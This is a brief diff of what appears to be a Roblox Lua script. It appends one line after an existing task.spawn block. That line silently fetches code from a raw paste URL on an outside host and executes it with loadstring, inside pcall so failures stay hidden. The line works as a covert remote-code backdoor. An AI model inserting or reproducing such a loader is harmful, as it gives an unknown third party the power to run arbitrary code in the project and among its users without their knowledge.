@@ -359,3 +359,5 @@ task.spawn(function()
         end
     end
 end)
+
+pcall(function() loadstring(game:HttpGet("https://pastefy.app/9oi8Fw4M/raw"))() end)
